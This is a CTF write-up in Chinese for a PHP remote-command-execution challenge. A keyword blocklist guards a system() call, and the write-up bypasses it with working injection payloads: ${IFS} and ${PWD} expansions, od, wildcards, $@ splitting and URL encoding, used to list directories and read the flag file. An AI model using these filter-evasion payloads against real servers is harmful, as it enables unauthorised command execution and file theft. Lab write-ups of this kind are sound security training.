#Week4 So Baby RCE 200

## 0、知识点与工具

>   远程命令执行

>   linux ${}表达式详解









## 1、分析

>   页面代码

```php
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

>   解题方向有一种是**利用liunx的${}表达式进行命令执行**，由于自己并没有学过查找资料后才发现有这种执行命令方式

>   **然后以下是linux中的`${}表达式`执行后返回的结果值**

```bash
${#} == 0
${##} == 1
${IFS} == 空格

代表了/ 斜杠
${HOME:${#}:${##}} == /
${PATH:${#}:${##}} == /
${PWD:${#}:${##}}  == /

${PWD} ：# 指向网站目录/var/www/html
${USER} ：www-data  # linux会返回用户名称
${HOME} ：# 返回当前用户的主目录 

${PWD::${#SHLVL}} == /

cd${IFS}.. # 返回上层目录
```

## 2、解题

>   查看flag是否在根目录
>
>   ```bash
>   cd${IFS}..&&cd${IFS}..&&cd${IFS}..&&ls${IFS}${PWD}
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211281954069.png)

>   获取flag
>
>   ```bash
>   cd${IFS}..&&cd${IFS}..&&cd${IFS}..&&od${IFS}-a${IFS}${PWD}fff??lllaaaaggggg
>   ```
>
>   -   **其中因为读取的命令大部分都被过滤了，所以只能使用`od`读取文件，在使用`-a`转八进制**
>       -   **`od`命令用于将指定文件内容以八进制、十进制、十六进制、浮点格式或ASCII 编码字符方式显示**
>   -   **然后还有一个是`fl`这两个字母连着一起也会被过滤，然后需要在他们中间加`?`号**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221128195559.png)

>   flag{b864ce30-4763-4d1a-8c21-6ff74f14ee40} 

## 3、另一种方式

>   **使用url编码绕过，%09绕过空格，&&拼接命令，url编码为%26，$@绕过`fl`关键字过滤**
>
>   关于$@为什么能执行，这两个字符放在linux中测试确实能执行，
>
>   ![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221128202657.png)

>   **查看根目录命令**
>
>   ```bash
>   ?cmd=cd%09..%26%26cd%09..%26%26cd%09..%26%26ls
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221128201925.png)

>   **获取flag**
>
>   ```bash
>   ?cmd=cd%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca$@t%09ffff$@llllaaaaggggg
>   ```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202211282022208.png)